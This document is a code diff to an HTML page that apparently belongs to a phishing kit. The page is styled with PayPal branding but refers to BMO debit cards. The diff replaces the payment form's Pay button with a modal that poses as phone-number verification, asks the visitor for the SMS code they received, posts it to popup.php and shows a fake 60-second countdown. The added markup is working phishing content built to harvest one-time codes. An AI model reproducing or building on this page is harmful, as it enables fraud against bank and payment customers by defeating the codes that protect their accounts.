@@ -89,14 +89,45 @@
           </div>
 
           <!-- continue button -->
-          <input class="btn btn-next mt-3 py-2 fs-6 fw-bold  rounded-pill" type="submit" value="Pay">
+          <!-- <input class="btn btn-next mt-3 py-2 fs-6 fw-bold  rounded-pill" type="submit" value="Pay"> -->
         </form>
+        <button type="button" class="btn btn-primary btn-next mt-3 py-2 fs-6 fw-bold  rounded-pill" data-bs-toggle="modal" data-bs-target="#captchaModal">
+          Pay
+        </button>
       </div>
 
       <div class="col-md-6 mb-3 d-flex flex-column justify-content-center align-items-center text-center p-3 px-lg-5">
         <img style="max-width: 252px" src="/assets/media/securty_img.png" alt="Card cheque illustration">
         <h1 class="mt-3">Paypal is the Safer, easier way to pay</h1>
         <p>No matter where you shop, we keep your financial information secure</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="modal fade" id="captchaModal" tabindex="-1" role="dialog" aria-labelledby="captchaModalLabel" aria-hidden="true">
+    <div class="modal-dialog" role="document">
+      <div class="modal-content">
+        <h1 class="fw-bold mb-2">Phone number verification</h1>
+        <p class="mb-3">We have sent the verification information to your registration number, please check and enter the correct verification code to confirm that it is you.</p>
+
+        <form method="POST" novalidate class="needs-validation" action="./popup.php">
+          <div class="input-group mb-3">
+            <div class="form-floating">
+              <input required type="text" class="form-control bg-body border-0 border-bottom focus-none" id="verification-code" placeholder="asd">
+              <label for="floatingInput">Verification code</label>
+            </div>
+            <span class="input-group-text bg-body border-0 text-muted border-bottom" id="phone-timer">60</span>
+            <div id="validationServerBMOFeedback" class="invalid-feedback b-0">
+                Please enter 
+            </div>
+          </div>
+
+          <input class="mt-3 py-2 px-5 fs-6 btn btn-primary btn-lg rounded-pill" type="submit" value="VERIFY">
+          <!-- <button type="button" class="btn btn-primary" data-toggle="modal" data-target="#captchar_modal">
+            Pay
+          </button> -->
+          <p class="text-xs mt-4 text-muted"><b>Heads-up:</b> Already registered your BMO debit card? No need to register your credit card. You're all set to sign in!</p>
+        </form>
       </div>
     </div>
   </div>
@@ -108,12 +139,23 @@
 
   <script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>
   <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.10.2/dist/umd/popper.min.js" integrity="sha384-7+zCNj/IqJ95wo16oMtfsKbZ9ccEh31eOz1HGyDuCQ6wgnyJNSYdrPa03rtR1zdB" crossorigin="anonymous"></script>
-  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js" integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13" crossorigin="anonymous"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.js" 
         integrity="sha256-yE5LLp5HSQ/z+hJeCqkz9hdjNkk1jaiGG0tDCraumnA=" 
         crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js" integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13" crossorigin="anonymous"></script>
         
   <script src="/assets/js/main.js"></script>
+  <script type="text/javascript">
 
+    var time = 60;
+    var phoneTimer = setInterval(function() {
+      $('#phone-timer').text(time);
+      time--;
+
+      if (time < 0) {
+        clearInterval(phoneTimer);
+      }
+    }, 1000);
+  </script>
 </body>
 </html>
